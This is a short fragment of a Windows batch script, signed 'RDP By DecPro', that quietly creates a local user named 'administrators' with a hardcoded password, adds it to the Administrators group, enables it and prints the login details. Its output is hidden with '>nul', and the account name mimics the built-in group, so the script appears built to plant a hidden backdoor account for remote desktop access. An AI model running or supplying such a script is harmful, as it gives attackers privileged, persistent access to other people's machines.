...
net user administrators DecPro@ /add >nul
net localgroup administrators administrators /add >nul
net user administrators /active:yes >nul
...
echo Username: administrators
echo Password: DecPro@
echo .
echo  RDP By DecPro
